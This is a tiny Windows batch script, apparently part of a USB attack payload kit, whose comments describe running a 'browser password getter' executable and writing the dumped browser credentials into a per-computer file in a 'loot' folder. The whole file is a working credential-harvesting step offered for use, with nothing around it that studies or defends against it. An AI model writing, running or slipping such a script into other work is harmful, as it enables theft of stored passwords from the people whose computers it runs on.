REM Go to dir run browser password getter
REM paste txt file in loot folder
cd /d %~dp0

s.exe /stext %~dp0\..\..\loot\BrowserGetter\%Computername%.txt
